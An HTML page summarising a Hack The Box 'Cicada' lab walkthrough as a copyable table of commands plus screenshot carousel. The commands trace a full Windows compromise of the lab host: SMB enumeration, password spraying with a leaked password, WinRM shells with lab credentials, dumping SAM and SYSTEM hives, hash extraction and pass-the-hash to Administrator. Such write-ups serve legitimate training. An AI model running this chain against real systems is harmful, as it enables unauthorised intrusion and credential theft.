<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>HTB Cicada Lab Walkthrough</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
   
    body {
      margin: 0;
      font-family: 'Fira Mono', Menlo, monospace;
      background: #0a0f1a;
      color: #cdd6f4;
      user-select: none;
    }
    .container {
      width: 90vw;
      margin: 2rem auto;
      min-height: 80vh;
      background: #121721;
      box-shadow: 0 0 25px #3b0a0a;
      border-radius: 10px;
      padding: 1.5rem;
      display: flex;
      flex-direction: column;
      border: 1px solid #4a0e0e;
    }
    h1.title {
      text-align: center;
      font-weight: bold;
      font-size: 2.2rem;
      letter-spacing: 0.1em;
      color: #51a7f9; /* bright radium blue */
      margin-bottom: 1.6rem;
      text-shadow: 0 0 8px #f53952, 0 0 15px #bf0a0a;
    }
    .content {
      display: flex;
      gap: 2rem;
      flex: 1 1 auto;
      min-height: 300px;
    }
    .left,
    .right {
      padding: 1rem;
      border-radius: 8px;
    }
    .left {
      width: 55%;
      background: #181f2e;
      box-shadow: inset 0 0 12px #003366;
      font-size: 1rem;
      overflow-x: auto;
      border: 1px solid #003366;
      color: #cbd6f6;
    }
    .left h3 {
      color: #f53952;
      text-shadow: 0 0 6px #ff0000;
      margin-bottom: 1rem;
    }
    .right {
      width: 45%;
      background: #121720;
      box-shadow: inset 0 0 10px #660000;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      border: 1px solid #660000;
      color: #e0e8ff;
    }
   
    .carousel-container {
      width: 100%;
      max-width: 420px;
      position: relative;
      background: #0f1220;
      border-radius: 12px;
      box-shadow: 0 2px 12px #bb2828;
      overflow: hidden;
      margin: 0 auto;
      border: 2px solid #bf0a0a;
    }
    .carousel-slide {
      display: none;
    }
    .carousel-slide.active {
      display: block;
      animation: fadeIn 0.5s ease forwards;
    }
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(15px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    .carousel-img {
      width: 100%;
      max-width: 100%;
      height: 400px; /* or adjust as needed */
      max-height: 70vh; /* Responsive on different screens */
      object-fit: contain; /* or 'cover' if you prefer cropping */
      background: #1c1f35;
      filter: drop-shadow(0 0 8px #f54242);
      border-radius: 8px;
      display: block;
      margin: 0 auto;
    }
    .carousel-controls {
      display: flex;
      justify-content: space-between;
      margin-top: 0.45rem;
    }
    .carousel-btn {
      background: #0b2a4b;
      color: #f53952;
      border: none;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      font-size: 1.7rem;
      cursor: pointer;
      transition: background 0.3s, color 0.3s;
      text-shadow: 0 0 6px #f53952;
    }
    .carousel-btn:hover {
      background: #f53952;
      color: #0a1220;
      box-shadow: 0 0 12px #ff0000;
    }
    .carousel-caption {
      background: rgba(191, 10, 10, 0.75);
      color: #f0f2f7;
      font-size: 1rem;
      padding: 0.5em 1em;
      position: absolute;
      bottom: 12px;
      left: 12px;
      border-radius: 6px;
      max-width: 90%;
      pointer-events: none;
      user-select: none;
      font-weight: 600;
      text-shadow: 0 0 4px #f53952;
    }
    /* Responsive */
    @media (max-width: 900px) {
      .content {
        flex-direction: column;
        gap: 1rem;
      }
      .left,
      .right {
        width: 100%;
      }
      .carousel-container {
        max-width: 100vw;
      }
    }
    code {
      display: block;
      background: #161b2d;
      color: #ff6e67;
      padding: 0.35em 0.75em;
      border-radius: 6px;
      margin-bottom: 0.5em;
      font-size: 1em;
      font-weight: 600;
      text-shadow: 0 0 6px #e01010;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-bottom: 1.2em;
      font-size: 1em;
    }
    th,
    td {
      padding: 0.6em;
      border-bottom: 1px solid #3a0a0a;
      text-align: left;
      color: #f0dcdc;
    }
    th {
      background: #bf0a0a;
      color: #fff;
      text-shadow: 0 0 4px #660000;
    }
  </style>
</head>
<body>
  <div class="container">
    <div>
      <h1 class="title">HTB Cicada Lab Walkthrough Analysis</h1>
    </div>
    <div class="content">
      <!-- Commands Left -->
      <div class="left">
        <h3>All Commands</h3>
        <table>
          <thead>
            <tr>
              <th>Command</th>
              <th>Description</th>
            </tr>
          </thead>
          <tbody id="commands-body"><!-- commands dynamically inserted here --></tbody>
        </table>
      </div>
      <!-- Carousel Right -->
      <div class="right">
        <h3 style="margin-top:0;">PoC Images</h3>
        <div class="carousel-container" id="carousel"><!-- slides dynamically inserted here --></div>
        <div class="carousel-controls">
          <button class="carousel-btn" id="carousel-prev" aria-label="Previous slide">&#8592;</button>
          <button class="carousel-btn" id="carousel-next" aria-label="Next slide">&#8594;</button>
        </div>
        <small style="margin-top:0.5em;">(Use arrows to slide through images)</small>
      </div>
    </div>
  </div>

  <script>
    // Commands List as array of objects
    const commands = [
      { cmd: 'nmap -sC -sV -Pn 10.10.11.35', desc: 'Scan ports/services with default scripts.' },
      { cmd: 'echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts', desc: 'Add domain to hosts file.' },
      { cmd: 'crackmapexec smb cicada.htb --shares', desc: 'Enumerate accessible SMB shares, anon.' },
      { cmd: "crackmapexec smb cicada.htb -u 'guest' -p '' --shares", desc: 'Same, as guest user.' },
      { cmd: 'smbclient //cicada.htb/HR', desc: "Connect to 'HR' SMB share." },
      { cmd: 'dir (in smbclient)', desc: 'List share files.' },
      { cmd: 'get "Notice from HR.txt"', desc: 'Download file from SMB share.' },
      { cmd: "impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass", desc: 'Enumerate SIDs on domain.' },
      { cmd: "crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'", desc: 'Password spray all users.' },
      { cmd: "crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users", desc: 'Enumerate users as Michael.' },
      { cmd: "smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'", desc: "Connect to DEV with David's creds." },
      { cmd: 'get Backup_script.ps1', desc: 'Download PowerShell script.' },
      { cmd: "evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb", desc: 'WinRM shell as Emily.' },
      { cmd: 'whoami /priv', desc: 'Show user privileges.' },
      { cmd: 'reg save hklm\\sam sam & reg save hklm\\system system', desc: 'Dump registry hives.' },
      { cmd: 'download sam, download system', desc: 'Retrieve hives for hash extraction.' },
      { cmd: 'impacket-secretsdump -sam sam -system system local', desc: 'Extract NTLM hashes offline.' },
      { cmd: "evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb", desc: 'Admin shell via pass-the-hash.' }
    ];

    // Populate commands in the table
    const commandsBody = document.getElementById('commands-body');
    commands.forEach(({ cmd, desc }) => {
      const tr = document.createElement('tr');
      const tdCmd = document.createElement('td');
      const code = document.createElement('code');
      code.textContent = cmd;
      tdCmd.appendChild(code);
      // Create the copy button
      const copyBtn = document.createElement('button');
      copyBtn.className = 'copy-btn';
      copyBtn.textContent = 'ðŸ“‹';
      copyBtn.title = 'Copy to clipboard';
      copyBtn.onclick = function() {
        navigator.clipboard.writeText(cmd)
          .then(() => {
            copyBtn.textContent = 'âœ“';
            setTimeout(() => copyBtn.textContent = 'ðŸ“‹', 800);
          });
      };

// Now append the button
tdCmd.appendChild(copyBtn);

      const tdDesc = document.createElement('td');
      tdDesc.textContent = desc;
      tr.appendChild(tdCmd);
      tr.appendChild(tdDesc);
      commandsBody.appendChild(tr);
    });

    // Set how many images you have in the img/ folder (named 1.png, 2.png, etc.)
    const totalImages = 22;  // <-- Change this number to your actual image count

    // Carousel container for the images
    const carouselContainer = document.getElementById('carousel');

    // Create carousel slides dynamically based on available images
    function createSlides(n) {
      for (let i = 1; i <= n; i++) {
        const slide = document.createElement('div');
        slide.classList.add('carousel-slide');
        if (i === 1) slide.classList.add('active');

        const img = document.createElement('img');
        img.src = `img/${i}.png`;
        img.alt = `PoC Image ${i}`;
        img.classList.add('carousel-img');

        const caption = document.createElement('div');
        caption.classList.add('carousel-caption');
        caption.textContent = `PoC Image ${i}`;

        slide.appendChild(img);
        slide.appendChild(caption);
        carouselContainer.appendChild(slide);
      }
    }
    createSlides(totalImages);

    // Carousel navigation
    const slides = document.querySelectorAll('.carousel-slide');
    const prevBtn = document.getElementById('carousel-prev');
    const nextBtn = document.getElementById('carousel-next');
    let currentIndex = 0;

    function showSlide(idx) {
      slides.forEach((slide, i) => {
        slide.classList.toggle('active', i === idx);
      });
    }

    prevBtn.onclick = () => {
      currentIndex = (currentIndex - 1 + slides.length) % slides.length;
      showSlide(currentIndex);
    };

    nextBtn.onclick = () => {
      currentIndex = (currentIndex + 1) % slides.length;
      showSlide(currentIndex);
    };
  </script>
</body>
</html>
